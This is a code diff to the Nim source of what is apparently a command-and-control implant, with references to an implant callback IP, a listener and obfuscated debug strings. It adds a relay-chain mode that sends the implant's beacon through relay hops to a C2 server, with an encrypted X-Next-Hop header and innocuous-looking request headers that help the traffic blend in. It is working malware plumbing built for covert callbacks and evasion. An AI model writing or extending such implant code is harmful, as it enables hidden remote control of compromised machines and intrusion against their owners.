@@ -1,5 +1,5 @@
 # Use puppy for all architectures (ARM64 and Intel x64)
-import base64, json, puppy, sequtils
+import base64, json, puppy, sequtils, httpclient
 from strutils import split, toLowerAscii, replace, strip, startsWith, toHex
 from os import parseCmdLine
 
@@ -59,9 +59,70 @@ type
 
 
 
-# HTTP request function using puppy for all architectures
+# HTTP request function - uses httpclient for relay, puppy otherwise
 proc doRequest(li : Listener, path : string, postKey : string = "", postValue : string = "", verb : string = "get") : puppy.Response =
     try:
+        # Check if we're using relay chain (use httpclient for better socket control)
+        const RELAY_CHAIN {.strdefine.}: string = ""
+        when RELAY_CHAIN != "":
+            # Use httpclient for relay connections (better socket handling)
+            when defined verbose:
+                echo obf("DEBUG: doRequest() - Using httpclient for relay")
+                echo obf("DEBUG: doRequest() - listenerType: ") & li.listenerType
+                echo obf("DEBUG: doRequest() - path: ") & path
+            
+            # Extract first hop from RELAY_CHAIN
+            const relayChainParts = RELAY_CHAIN.split(",")
+            const firstHop = relayChainParts[0]
+            
+            # Build target URL with first relay hop
+            let target = toLowerAscii(li.listenerType) & "://" & firstHop & path
+            
+            when defined verbose:
+                echo obf("DEBUG: Using first relay hop as target: ") & firstHop
+                echo obf("DEBUG: doRequest() - target URL: ") & target
+            
+            # Create httpclient
+            var client = newHttpClient(timeout = 30000)
+            defer: client.close()
+            
+            # Build headers
+            var headers = newHttpHeaders()
+            
+            # Only send ID header once listener is registered
+            if li.id != "":
+                headers["X-Request-ID"] = li.id
+            headers["User-Agent"] = li.userAgent
+            headers["Content-Type"] = "application/json"
+            headers["X-Correlation-ID"] = li.httpAllowCommunicationKey
+            
+            # Add X-Next-Hop header
+            let encryptedNextHop = encryptNextHop(RELAY_CHAIN)
+            headers["X-Next-Hop"] = encryptedNextHop
+            
+            when defined verbose:
+                echo obf("DEBUG: Added X-Next-Hop header for relay chain: ") & RELAY_CHAIN
+                echo obf("DEBUG: doRequest() - About to request()")
+            
+            # Make request
+            let response = client.request(target, httpMethod = HttpGet, headers = headers)
+            
+            when defined verbose:
+                echo obf("DEBUG: doRequest() - request() completed")
+                echo obf("DEBUG: doRequest() - Response code: ") & $response.code.int
+            
+            # Convert to puppy.Response format
+            var puppyResp = puppy.Response()
+            puppyResp.code = response.code.int
+            puppyResp.body = response.body
+            
+            # Copy headers
+            for key, value in response.headers.pairs:
+                puppyResp.headers.add((key, value))
+            
+            return puppyResp
+        else:
+            # Standard mode: use puppy
             when defined verbose:
                 echo obf("DEBUG: doRequest() - Using puppy")
                 echo obf("DEBUG: doRequest() - listenerType: ") & li.listenerType
@@ -70,45 +131,32 @@ proc doRequest(li : Listener, path : string, postKey : string = "", postValue : 
                 echo obf("DEBUG: doRequest() - listenerPort: ") & li.listenerPort
                 echo obf("DEBUG: doRequest() - path: ") & path
             
-            # Determine target URL based on implantCallbackIp or RELAY_CHAIN
+            # Determine target URL based on implantCallbackIp
             var target : string
             
-            # If RELAY_CHAIN is defined, extract first hop as target
-            const RELAY_CHAIN {.strdefine.}: string = ""
-            when RELAY_CHAIN != "":
-                # Extract first hop from RELAY_CHAIN (format: "relay1:8080,relay2:8080,c2:5000")
-                const relayChainParts = RELAY_CHAIN.split(",")
-                const firstHop = relayChainParts[0]
-                
-                # Build target URL with first relay hop
-                target = toLowerAscii(li.listenerType) & "://" & firstHop & path
-                
-                when defined verbose:
-                    echo obf("DEBUG: Using first relay hop as target: ") & firstHop
+            # Standard mode: use implantCallbackIp from config
+            # Check if implantCallbackIp already includes protocol (http:// or https://)
+            if li.implantCallbackIp.startsWith("http://") or li.implantCallbackIp.startsWith("https://"):
+                # Full URL provided, use as-is and append path
+                target = li.implantCallbackIp & path
             else:
-                # Standard mode: use implantCallbackIp from config
-                # Check if implantCallbackIp already includes protocol (http:// or https://)
-                if li.implantCallbackIp.startsWith("http://") or li.implantCallbackIp.startsWith("https://"):
-                    # Full URL provided, use as-is and append path
-                    target = li.implantCallbackIp & path
+                # Only host provided, build URL with protocol from config
+                target = toLowerAscii(li.listenerType) & "://"
+                
+                # Smart detection: If implantCallbackIp looks like a domain (contains letters),
+                # don't add port (uses protocol default). If it's an IP, add port.
+                var needsPort = true
+                for c in li.implantCallbackIp:
+                    if c in {'a'..'z', 'A'..'Z'}:
+                        needsPort = false
+                        break
+                
+                if needsPort:
+                    target = target & li.implantCallbackIp & ":" & li.listenerPort
                 else:
-                    # Only host provided, build URL with protocol from config
-                    target = toLowerAscii(li.listenerType) & "://"
-                    
-                    # Smart detection: If implantCallbackIp looks like a domain (contains letters),
-                    # don't add port (uses protocol default). If it's an IP, add port.
-                    var needsPort = true
-                    for c in li.implantCallbackIp:
-                        if c in {'a'..'z', 'A'..'Z'}:
-                            needsPort = false
-                            break
-                    
-                    if needsPort:
-                        target = target & li.implantCallbackIp & ":" & li.listenerPort
-                    else:
-                        target = target & li.implantCallbackIp
-                    
-                    target = target & path
+                    target = target & li.implantCallbackIp
+                
+                target = target & path
 
             when defined verbose:
                 echo obf("DEBUG: doRequest() - target URL: ") & target
@@ -152,13 +200,7 @@ proc doRequest(li : Listener, path : string, postKey : string = "", postValue : 
                             Header(key: "Content-Type", value: "application/json")
                         ]
                 
-                # Add X-Next-Hop header if relay chain is configured
-                const RELAY_CHAIN {.strdefine.}: string = ""
-                when RELAY_CHAIN != "":
-                    let encryptedNextHop = encryptNextHop(RELAY_CHAIN)
-                    headers.add(Header(key: "X-Next-Hop", value: encryptedNextHop))
-                    when defined verbose:
-                        echo obf("DEBUG: Added X-Next-Hop header for relay chain: ") & RELAY_CHAIN
+                # X-Next-Hop header already handled by httpclient path above for relay mode
                 
                 # Add workspace_uuid header if provided
                 if workspace_uuid != "":
@@ -206,13 +248,7 @@ proc doRequest(li : Listener, path : string, postKey : string = "", postValue : 
                         Header(key: "X-Correlation-ID", value: li.httpAllowCommunicationKey)
                     ]
                 
-                # Add X-Next-Hop header if relay chain is configured
-                const RELAY_CHAIN {.strdefine.}: string = ""
-                when RELAY_CHAIN != "":
-                    let encryptedNextHop = encryptNextHop(RELAY_CHAIN)
-                    headers.add(Header(key: "X-Next-Hop", value: encryptedNextHop))
-                    when defined verbose:
-                        echo obf("DEBUG: Added X-Next-Hop header for relay chain (POST): ") & RELAY_CHAIN
+                # X-Next-Hop header already handled by httpclient path above for relay mode
                 
                 # Add workspace_uuid header if provided
                 if workspace_uuid != "":
